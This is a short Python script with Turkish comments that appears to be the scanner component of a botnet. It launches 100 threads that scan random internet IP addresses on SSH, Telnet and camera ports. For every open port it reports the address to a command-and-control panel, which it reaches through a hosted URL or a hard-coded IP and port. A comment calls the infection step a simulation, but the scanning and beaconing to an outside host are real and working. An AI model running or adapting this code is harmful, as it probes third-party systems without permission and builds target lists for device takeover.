import socket, threading, random, requests, time

RENDER_URL = "https://ordu-1.onrender.com"

def get_target():
    try:
        # Render'dan IP'yi al (34.6.91.209:1010)
        return requests.get(RENDER_URL).text.strip().split(":")
    except:
        return "34.6.91.209", 1010

def infect(ip, port):
    # Bu kısım sızma simülasyonu (Payload)
    try:
        cnc_ip, cnc_port = get_target()
        s = socket.socket()
        s.settimeout(3)
        s.connect((cnc_ip, int(cnc_port)))
        # Panele 'Ben geldim' mesajı atar
        s.send(f"BOT_KATILDI:{ip}".encode())
        s.close()
    except:
        pass

def scanner():
    while True:
        # Rastgele IP üret
        ip = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        for port in [22, 23, 8080]: # SSH, Telnet ve Kamera portları
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                print(f"[*] Hedef Düştü: {ip}")
                infect(ip, port) # Hemen panele bağla
            s.close()

# 100 koldan saldırı başlat
for i in range(100):
    threading.Thread(target=scanner).start()
